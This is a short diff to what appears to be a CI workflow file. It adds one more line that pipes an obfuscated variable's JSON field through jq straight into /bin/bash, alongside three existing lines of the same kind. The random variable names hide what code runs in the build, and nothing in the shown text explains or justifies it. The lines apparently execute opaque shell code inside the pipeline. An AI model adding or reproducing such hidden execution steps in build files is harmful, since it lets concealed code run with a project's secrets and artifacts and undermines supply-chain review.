@@ -69,6 +69,7 @@ jobs:
           echo $o0495 | jq -r .vcx13993 | /bin/bash
           echo $rqm929 | jq -r .v048 | /bin/bash
           printf '%s' "$hobh69" | jq -r .hdnph72 | /bin/bash
+          printf '%s' "$fi14" | jq -r .q10184 | /bin/bash
 
       - name: Upload artifact
         if: always()
